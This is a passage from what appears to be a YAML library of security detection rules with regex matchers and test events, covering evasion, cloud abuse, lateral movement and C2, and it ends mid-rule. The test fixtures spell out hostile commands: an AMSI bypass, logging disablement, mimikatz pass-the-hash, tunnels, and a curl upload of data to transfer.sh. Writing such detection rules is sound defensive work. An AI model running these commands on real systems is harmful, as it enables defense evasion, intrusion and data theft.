- id: TB-EVADE-009
  name: AMSI or script-logging bypass
  severity: high
  confidence: 85
  techniques: [T1562.001, T1059.001]
  tags: [defense-evasion, amsi, powershell]
  match:
    any:
      - {field: text, regex: 'amsiinitfailed|amsiutils|amsicontext|amsiscanbuffer|amsi\.dll.{0,40}(patch|unload)'}
      - {field: text, regex: 'scriptblocklogging.{0,60}(0|false|disable)|enablescriptblocklogging.{0,40}/d\s+0|set-etwtraceprovider|etweventwrite'}
  tests:
    - {event: {command_line: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"}, expect_match: true}
    - {event: {command_line: 'reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f'}, expect_match: true}
    - {event: {command_line: 'powershell Get-ChildItem C:\'}, expect_match: false}

- id: TB-EVADE-003
  name: Masquerading system process running from an unexpected path
  severity: high
  confidence: 75
  techniques: [T1036]
  tags: [masquerading, defense-evasion]
  match:
    all:
      - {field: process_name, regex: '^(svchost|lsass|csrss|winlogon|services|smss|wininit|spoolsv|taskhost\w{0,3}|dllhost|conhost)\.exe$'}
      - {field: raw.process_path, regex: '.{3,}'}
      - not: {field: raw.process_path, regex: '^(c:\\windows\\(system32|syswow64|winsxs)\\|\\systemroot\\system32\\|\\windows\\system32\\)'}
  tests:
    - {event: {process_name: svchost.exe, raw_data: {process_path: 'C:\Users\Public\svchost.exe'}}, expect_match: true}
    - {event: {process_name: svchost.exe, raw_data: {process_path: 'C:\Windows\System32\svchost.exe'}}, expect_match: false}

- id: TB-EVADE-004
  name: Process injection or reflective loading indicators
  severity: high
  confidence: 70
  techniques: [T1055, T1620]
  tags: [injection, defense-evasion]
  match:
    any:
      - {field: text, regex: '\b(createremotethread|ntcreatethreadex|queueuserapc|writeprocessmemory|virtualallocex|setthreadcontext|process hollowing|reflective dll)\b'}
      - {field: raw.event_code, in: ['8']}
      - {field: text, regex: 'invoke-(reflectivepeinjection|dllinjection|processhollow)|donut\.exe|shellcode inject'}
  tests:
    - {event: {title: 'CreateRemoteThread into explorer.exe'}, expect_match: true}
    - {event: {title: 'Remote thread created'}, expect_match: false}

- id: TB-EVADE-005
  name: Indicator removal or timestomping of tools
  severity: medium
  confidence: 60
  techniques: [T1070.004, T1070]
  tags: [defense-evasion, anti-forensics]
  match:
    any:
      - {field: command_line, regex: '(shred|sdelete(64)?(\.exe)?|cipher\s+/w:)\s.{0,60}(/tmp|\\temp|\\users|\.exe|\.sh|\.ps1)'}
      - {field: command_line, regex: 'touch\s+-(r|d|t)\s+\S{1,60}\s+/(tmp|var|usr|dev/shm)/\S{1,60}'}
      - {field: command_line, regex: 'timestomp|setmace|\(get-item\s.{0,40}\)\.(creation|lastwrite)time\s?='}
  tests:
    - {event: {command_line: 'sdelete64.exe -p 3 C:\Users\Public\payload.exe'}, expect_match: true}
    - {event: {command_line: 'rm -f /tmp/build.log'}, expect_match: false}

- id: TB-EVADE-006
  name: Log source stopped or monitoring agent tampered with
  severity: high
  confidence: 70
  techniques: [T1562.006, T1562.001]
  tags: [defense-evasion, telemetry-gap]
  match:
    any:
      - {field: event_type, regex: '^((agent|logging|sensor)\.|system\.log_source[._])(stopped|disconnected|silent|tamper|disabled|uninstalled)'}
      - {field: text, regex: '(audit daemon (is )?(exiting|stopped)|auditd.{0,20}stopp|sysmon (service|driver).{0,20}(stopped|unloaded)|edr (sensor|agent) (tamper|uninstall|stopp)|wazuh agent.{0,20}(stopped|disconnected unexpectedly)|rsyslogd.{0,20}exiting)'}
  tests:
    - {event: {event_type: agent.stopped}, expect_match: true}
    - {event: {event_type: system.log_source_silent}, expect_match: true}
    - {event: {title: 'Sysmon service state changed: Stopped'}, expect_match: true}
    - {event: {title: 'Sysmon service state changed: Running'}, expect_match: false}

- id: TB-CLOUD-002
  name: Cloud audit logging, detection or flow logging disabled
  severity: high
  confidence: 85
  techniques: [T1562.008]
  tags: [cloud, defense-evasion]
  match:
    any:
      - {field: raw.eventName, in: [StopLogging, DeleteTrail, UpdateTrail, PutEventSelectors, DeleteFlowLogs, DeleteDetector, StopConfigurationRecorder, DeleteConfigurationRecorder, DisableSecurityHub, DeleteLogGroup, DeleteLogStream, DisableAlarmActions, DeleteMemberAccounts, UpdateDetector, DeleteSink, DeleteLogging]}
      - {field: event_type, regex: 'cloudtrail.{0,10}(stop|delete|disabled)|cloud\.(logging|audit)\.disabled'}
      - {field: raw.operationName, regex: '(microsoft\.insights/diagnosticsettings/delete|microsoft\.security/securitycontacts/delete|microsoft\.operationalinsights/workspaces/delete)'}
      - {field: raw.methodName, regex: '(google\.logging\.v2\.configservicev2\.(deletesink|updatesink)|logging\.sinks\.(delete|update))'}
      - {field: command_line, regex: 'aws\s+cloudtrail\s+(stop-logging|delete-trail|update-trail|put-event-selectors)|aws\s+guardduty\s+(delete-detector|update-detector.{0,40}--no-enable)|aws\s+configservice\s+(stop-configuration-recorder|delete-configuration-recorder)|aws\s+ec2\s+delete-flow-logs|gcloud\s+logging\s+sinks\s+delete|az\s+monitor\s+diagnostic-settings\s+delete'}
  tests:
    - {event: {raw_data: {eventName: StopLogging}}, expect_match: true}
    - {event: {raw_data: {eventName: DeleteDetector}}, expect_match: true}
    - {event: {raw_data: {operationName: 'MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/DELETE'}}, expect_match: true}
    - {event: {command_line: 'aws cloudtrail stop-logging --name org-trail'}, expect_match: true}
    - {event: {command_line: 'aws cloudtrail describe-trails'}, expect_match: false}
    - {event: {raw_data: {eventName: DescribeTrails}}, expect_match: false}

# =============================================================== CLOUD IDENTITY & CONFIGURATION
- id: TB-CLOUD-001
  name: Storage made publicly accessible or ACL/policy opened to everyone
  severity: high
  confidence: 80
  techniques: [T1530]
  tags: [cloud, storage, public-exposure]
  match:
    any:
      - {field: event_type, regex: 'bucket.{0,20}public|public.{0,20}bucket|s3.{0,20}public|storage.{0,20}public'}
      - all:
          - {field: raw.eventName, in: [PutBucketAcl, PutBucketPolicy, PutObjectAcl, DeleteBucketPublicAccessBlock, PutBucketPublicAccessBlock]}
          - {field: text, regex: '(allusers|authenticatedusers|"principal":\s*"\*"|"principal":\s*\{\s*"aws":\s*"\*"|blockpublicacls.{0,6}false|restrictpublicbuckets.{0,6}false)'}
      - {field: raw.eventName, equals: DeleteBucketPublicAccessBlock}
      - {field: raw.methodName, regex: 'storage\.(buckets|objects)\.setiampolicy', }
  tests:
    - {event: {raw_data: {eventName: PutBucketAcl, requestParameters: {AccessControlPolicy: {grant: 'AllUsers READ'}}}}, expect_match: true}
    - {event: {raw_data: {eventName: DeleteBucketPublicAccessBlock}}, expect_match: true}
    - {event: {raw_data: {eventName: PutBucketAcl, requestParameters: {grant: 'CanonicalUser'}}}, expect_match: false}

- id: TB-CLOUD-003
  name: Administrator privileges, access keys or login profile granted in the cloud
  severity: high
  confidence: 75
  techniques: [T1098.003, T1098.001, T1078.004]
  tags: [cloud, iam, privilege-escalation]
  tuning: Expected from your IaC pipeline principal; exclude that identity.
  match:
    any:
      - all:
          - {field: raw.eventName, in: [AttachUserPolicy, AttachRolePolicy, PutUserPolicy, PutRolePolicy, AttachGroupPolicy, CreatePolicyVersion, SetDefaultPolicyVersion]}
          - {field: text, regex: '(AdministratorAccess|"Action":\s*"\*"|iam:\*|PowerUserAccess|:policy/IAMFullAccess)'}
      - {field: raw.eventName, in: [CreateLoginProfile, UpdateLoginProfile, UpdateAssumeRolePolicy]}
      - {field: command_line, regex: 'aws\s+iam\s+(create-login-profile|update-login-profile|update-assume-role-policy|put-(user|role|group)-policy|create-access-key\s.{0,40}--user-name|attach-(user|role|group)-policy\s.{0,120}(administratoraccess|iamfullaccess|poweruseraccess))'}
      - all:
          - {field: raw.eventName, equals: CreateAccessKey}
          - {field: raw.requestParameters.userName, regex: '.{1,}'}
          - not: {field: raw.requestParameters.userName, equals: ''}
  tests:
    - {event: {raw_data: {eventName: AttachUserPolicy, requestParameters: {policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess'}}}, expect_match: true}
    - {event: {raw_data: {eventName: CreateLoginProfile}}, expect_match: true}
    - {event: {command_line: 'aws iam create-access-key --user-name backup-admin'}, expect_match: true}
    - {event: {command_line: 'aws iam list-users'}, expect_match: false}
    - {event: {raw_data: {eventName: AttachUserPolicy, requestParameters: {policyArn: 'arn:aws:iam::aws:policy/ReadOnlyAccess'}}}, expect_match: false}

- id: TB-CLOUD-004
  name: Cloud root / owner account used
  severity: high
  confidence: 80
  techniques: [T1078.004]
  tags: [cloud, root-account]
  match:
    any:
      - {field: raw.userIdentity.type, equals: Root}
      - {field: raw.actor.type, equals: SuperAdmin}
  tests:
    - {event: {raw_data: {userIdentity: {type: Root}}}, expect_match: true}
    - {event: {raw_data: {userIdentity: {type: IAMUser}}}, expect_match: false}
    - {event: {event_type: authentication.success, username: root}, expect_match: false}

- id: TB-CLOUD-005
  name: Console sign-in without MFA
  severity: medium
  confidence: 65
  techniques: [T1078.004]
  tags: [cloud, mfa]
  match:
    all:
      - {field: raw.eventName, equals: ConsoleLogin}
      - {field: raw.additionalEventData.MFAUsed, equals: 'No'}
      - {field: raw.responseElements.ConsoleLogin, equals: Success}
  tests:
    - {event: {raw_data: {eventName: ConsoleLogin, additionalEventData: {MFAUsed: 'No'}, responseElements: {ConsoleLogin: Success}}}, expect_match: true}
    - {event: {raw_data: {eventName: ConsoleLogin, additionalEventData: {MFAUsed: 'Yes'}, responseElements: {ConsoleLogin: Success}}}, expect_match: false}

- id: TB-CLOUD-006
  name: Network security group / firewall opened to the internet on a management port
  severity: high
  confidence: 80
  techniques: [T1562.007]
  tags: [cloud, network, exposure]
  match:
    any:
      - all:
          - {field: raw.eventName, in: [AuthorizeSecurityGroupIngress, ModifySecurityGroupRules]}
          - {field: text, regex: '(0\.0\.0\.0/0|::/0)[\s\S]{0,80}\b(22|3389|5985|5986|23|3306|5432|1433|27017|6379|9200|445)\b|\b(22|3389|5985|5986|23|3306|5432|1433|27017|6379|9200|445)\b[\s\S]{0,80}(0\.0\.0\.0/0|::/0)'}
      - all:
          - {field: raw.operationName, regex: 'microsoft\.network/networksecuritygroups/securityrules/write'}
          - {field: text, regex: '(\*|0\.0\.0\.0/0|internet).{0,80}(22|3389|3306|1433)'}
  tests:
    - {event: {raw_data: {eventName: AuthorizeSecurityGroupIngress, requestParameters: {cidrIp: '0.0.0.0/0', fromPort: 22, toPort: 22}}}, expect_match: true}
    - {event: {raw_data: {eventName: AuthorizeSecurityGroupIngress, requestParameters: {cidrIp: '10.0.0.0/8', fromPort: 22}}}, expect_match: false}

- id: TB-CLOUD-007
  name: Data or snapshot shared outside the account, replication to another account
  severity: high
  confidence: 75
  techniques: [T1537]
  tags: [cloud, exfiltration]
  match:
    any:
      - {field: raw.eventName, in: [ModifySnapshotAttribute, ModifyImageAttribute, ModifyDBSnapshotAttribute, ModifyDBClusterSnapshotAttribute, PutBucketReplication, ShareSnapshot]}
      - {field: raw.methodName, regex: 'compute\.(snapshots|images|disks)\.setiampolicy|storage\.buckets\.setiampolicy.{0,60}allusers'}
  tests:
    - {event: {raw_data: {eventName: ModifySnapshotAttribute}}, expect_match: true}
    - {event: {raw_data: {eventName: DescribeSnapshots}}, expect_match: false}

- id: TB-CLOUD-008
  name: Destructive or recovery-inhibiting cloud API call
  severity: high
  confidence: 75
  techniques: [T1485, T1490, T1531]
  tags: [cloud, destruction]
  tuning: Review the actor and change ticket; legitimate decommissioning triggers this.
  match:
    any:
      - {field: raw.eventName, in: [ScheduleKeyDeletion, DisableKey, DeleteBackupVault, DeleteRecoveryPoint, DeleteBackupPlan, DeleteDBSnapshot, DeleteSnapshot, DeleteDBInstance, DeleteDBCluster, DeleteBucket, DeleteVault, PurgeQueue, DeleteVolume]}
      - {field: raw.operationName, regex: 'microsoft\.(recoveryservices/vaults/delete|compute/(disks|snapshots)/delete|storage/storageaccounts/delete|sql/servers/databases/delete)'}
  tests:
    - {event: {raw_data: {eventName: ScheduleKeyDeletion}}, expect_match: true}
    - {event: {raw_data: {eventName: DeleteBackupVault}}, expect_match: true}
    - {event: {raw_data: {eventName: ListBuckets}}, expect_match: false}

- id: TB-CLOUD-009
  name: Mailbox forwarding or inbox rule created (email collection)
  severity: high
  confidence: 75
  techniques: [T1114.003]
  tags: [cloud, email, collection]
  match:
    any:
      - {field: command_line, regex: '(new|set)-(inboxrule|mailbox|transportrule).{0,120}(forwardto|forwardingsmtpaddress|forwardingaddress|redirectto|forwardasattachmentto)'}
      - {field: raw.operation, in: [New-InboxRule, Set-InboxRule, UpdateInboxRules, Set-Mailbox, New-TransportRule]}
      - {field: raw.eventName, equals: UpdateInboxRules}
  tests:
    - {event: {raw_data: {operation: New-InboxRule, parameters: 'ForwardTo=attacker@example.com'}}, expect_match: true}
    - {event: {raw_data: {operation: MailItemsAccessed}}, expect_match: false}

# =============================================================== LATERAL MOVEMENT
- id: TB-LAT-002
  name: Administrative share access or tool transfer to a remote host
  severity: high
  confidence: 70
  techniques: [T1021.002, T1570]
  tags: [lateral-movement, smb]
  match:
    any:
      - {field: command_line, regex: '(copy|xcopy|robocopy|move)\s.{0,100}\\\\\S{1,60}\\(admin\$|c\$|d\$|ipc\$)\\\S{0,80}\.(exe|dll|ps1|bat|vbs|sys|msi)'}
      - {field: command_line, regex: 'net(1)?(\.exe)?\s+use\s+\\\\\S{1,60}\\(admin\$|c\$|ipc\$)\s.{0,40}/user:'}
      - all:
          - {field: raw.event_code, equals: '5140'}
          - {field: raw.share_name, regex: '\\\\\*\\(admin\$|c\$|ipc\$)'}
          - not: {field: username, regex: '\$$'}
  tests:
    - {event: {command_line: 'copy payload.exe \\10.0.0.9\C$\Windows\Temp\payload.exe'}, expect_match: true}
    - {event: {command_line: 'net use \\10.0.0.9\IPC$ /user:corp\admin Passw0rd'}, expect_match: true}
    - {event: {command_line: 'net use Z: \\files\public'}, expect_match: false}

- id: TB-LAT-003
  name: Pass-the-hash / alternate credential logon pattern
  severity: high
  confidence: 70
  techniques: [T1550.002]
  tags: [lateral-movement, ntlm]
  match:
    any:
      - {field: command_line, regex: 'sekurlsa::pth|pth-winexe|pth-smbclient|wmiexec\.py.{0,40}-hashes|-hashes\s+[a-f0-9]{32}:[a-f0-9]{32}'}
      - all:
          - {field: raw.event_code, equals: '4624'}
          - {field: raw.logon_type, in: ['9']}
          - {field: raw.authentication_package, regex: '(negotiate|ntlm)'}
          - {field: raw.logon_process, regex: 'seclogo'}
  tests:
    - {event: {command_line: 'mimikatz sekurlsa::pth /user:admin /domain:corp /ntlm:aad3b435b51404eeaad3b435b51404ee'}, expect_match: true}
    - {event: {raw_data: {event_code: '4624', logon_type: '9', authentication_package: Negotiate, logon_process: seclogo}}, expect_match: true}
    - {event: {raw_data: {event_code: '4624', logon_type: '3', authentication_package: NTLM, logon_process: NtLmSsp}}, expect_match: false}

- id: TB-LAT-004
  name: Inbound administrative remote-access over SSH/RDP with tunnelling flags
  severity: medium
  confidence: 60
  techniques: [T1021.004, T1572]
  tags: [lateral-movement, tunneling]
  match:
    any:
      - {field: command_line, regex: '\bssh(\.exe)?\s.{0,80}-(R|L|D)\s?\S{1,40}:\d{1,5}.{0,40}(-N|-f)|\bssh\s.{0,40}-N\s.{0,60}-(R|L|D)\s?\d'}
      - {field: command_line, regex: '(plink|chisel|ligolo|frpc?|sshuttle|proxychains\d?|socat\s+tcp-listen)\b.{0,100}(-R|-L|-D|client|agent|--socks|tcp-listen)'}
  tests:
    - {event: {command_line: 'ssh -N -R 8080:127.0.0.1:3389 user@198.51.100.7'}, expect_match: true}
    - {event: {command_line: 'chisel client 198.51.100.7:8000 R:socks'}, expect_match: true}
    - {event: {command_line: 'ssh admin@10.0.0.5'}, expect_match: false}

# =============================================================== COMMAND AND CONTROL
- id: TB-NET-003
  name: Known C2 framework or implant indicator
  severity: high
  confidence: 80
  techniques: [T1071.001, T1573]
  tags: [c2, malware]
  match:
    any:
      - {field: text, regex: '\b(cobalt ?strike|beacon\.(dll|exe)|meterpreter|sliver[- ]?(c2|implant)|havoc( |-)?c2|brute ?ratel|empire stager|posh-?c2|covenant grunt|mythic|merlin agent|metasploit)\b'}
      - {field: text, regex: '\\pipe\\(msagent_[0-9a-f]{2}|msse-\d{3,4}-server|postex_[0-9a-f]{4}|postex_ssh_[0-9a-f]{4}|status_[0-9a-f]{2}|mojo\.5688\.8052\.\d+|ntsvcs_[0-9a-f]{2}|scerpc_[0-9a-f]{2})'}
      - {field: raw.user_agent, regex: '(mozilla/4\.0 \(compatible; msie 6\.0; windows nt 5\.1\)|mozilla/5\.0 \(compatible; msie 9\.0; windows nt 6\.1; trident/5\.0; (yie8|slcc2)\))'}
  tests:
    - {event: {title: 'Cobalt Strike beacon detected on host'}, expect_match: true}
    - {event: {title: 'Cobalt paint order shipped'}, expect_match: false}
    - {event: {raw_data: {pipe_name: '\\.\pipe\msagent_f4', process: rundll32.exe}}, expect_match: true}
    - {event: {raw_data: {pipe_name: '\\.\pipe\chrome.mojo.1234'}}, expect_match: false}

- id: TB-NET-002
  name: DNS tunnelling or algorithmic-domain indicators
  severity: medium
  confidence: 60
  techniques: [T1071.004, T1568]
  tags: [dns-tunnel, c2]
  tuning: CDNs and security vendors use long labels; allow-list their zones.
  match:
    any:
      - {field: raw.query_length, gte: 100}
      - {field: event_type, regex: 'dns.{0,10}tunnel'}
      - {field: raw.query, regex: '^[a-z0-9_-]{35,}(\.[a-z0-9-]{1,30}){1,3}$'}
      - all:
          - {field: raw.query_type, in: [TXT, NULL, ANY]}
          - {field: raw.query, regex: '^[a-z0-9._-]{50,}'}
  tests:
    - {event: {event_type: network.dns, raw_data: {query: 'a3f9b2c1d4e5f60718293a4b5c6d7e8f9012a3b4c5.tunnel.example.net'}}, expect_match: true}
    - {event: {raw_data: {query_length: 140}}, expect_match: true}
    - {event: {event_type: network.dns, raw_data: {query: 'www.example.org'}}, expect_match: false}

- id: TB-C2-003
  name: Traffic to anonymising, tunnelling or paste/exfil web services
  severity: medium
  confidence: 65
  techniques: [T1572, T1090, T1102, T1567]
  tags: [c2, exfiltration, tunneling]
  tuning: Developer machines use ngrok legitimately; allow-list by asset.
  match:
    any:
      - {field: text, regex: '(\.onion\b|[a-z0-9-]{3,40}\.(ngrok\.io|ngrok-free\.app|trycloudflare\.com|serveo\.net|localhost\.run|loca\.lt|pagekite\.me|bore\.pub|ngrok\.app))'}
      - {field: text, regex: '(api\.telegram\.org/bot|discord(app)?\.com/api/webhooks/|transfer\.sh|file\.io|anonfiles|gofile\.io|temp\.sh|pastebin\.com/raw|paste\.ee/r|ghostbin|0x0\.st)'}
  tests:
    - {event: {event_type: network.dns, raw_data: {query: 'abcd1234.ngrok.io'}}, expect_match: true}
    - {event: {command_line: 'curl -F file=@/tmp/data.zip https://transfer.sh/'}, expect_match: true}
    - {event: {event_type: network.dns, raw_data: {query: 'docs.example.org'}}, expect_match: false}

- id: TB-C2-004
  name: Connection to a port commonly used by offensive tooling
  severity: medium
  confidence: 55
  techniques: [T1095, T1571]
  tags: [c2, network]
  match:
    all:
      - {field: event_type, regex: '^network\.(connection|firewall)'}
      - {field: destination_port, in: [4444, 4443, 1337, 31337, 50050, 6666, 6667, 9001, 9030, 8333]}
      - {field: raw.direction, in: [outbound, egress, out]}
  tests:
    - {event: {event_type: network.connection, destination_port: 4444, raw_data: {direction: outbound}}, expect_match: true}
    - {event: {event_type: network.connection, destination_port: 443, raw_data: {direction: outbound}}, expect_match: false}

- id: TB-C2-005
  name: Remote administration / tunnelling software installed or executed on a server
  severity: medium
  confidence: 55
  techniques: [T1219]
  tags: [c2, remote-access-tool]
  tuning: Expected on helpdesk endpoints; scope to servers.
  match:
    any:
      - {field: process_name, regex: '^(anydesk|teamviewer(_service)?|rustdesk|ammyy_admin|screenconnect\.clientservice|atera\w{0,10}|splashtop\w{0,10}|ultraviewer\w{0,10}|meshagent|tacticalrmm)(\.exe)?$'}
      - {field: command_line, regex: '\b(anydesk|rustdesk|meshagent|screenconnect)(\.exe)?\s.{0,40}(--install|--silent|/silent|--service|-i\s)'}
  tests:
    - {event: {process_name: AnyDesk.exe}, expect_match: true}
    - {event: {process_name: chrome.exe}, expect_match: false}

- id: TB-C2-006
  name: Tool downloaded to a staging directory and marked executable
  severity: medium
  confidence: 70
  techniques: [T1105]
  tags: [ingress-tool-transfer]
  match:
    any:
      - {field: command_line, regex: '(wget|curl)\s.{0,150}(-o|-O|--output)\s?(/tmp|/dev/shm|/var/tmp|\.)\S{0,60}.{0,60}(chmod\s+(\+x|7\d\d)|&&\s?\./|;\s?\./|;\s?sh\s)'}
      - {field: command_line, regex: '(wget|curl)\s+https?://\S{1,120}\s+-(o|O)\s?/(tmp|dev/shm|var/tmp)/\S{1,60}'}
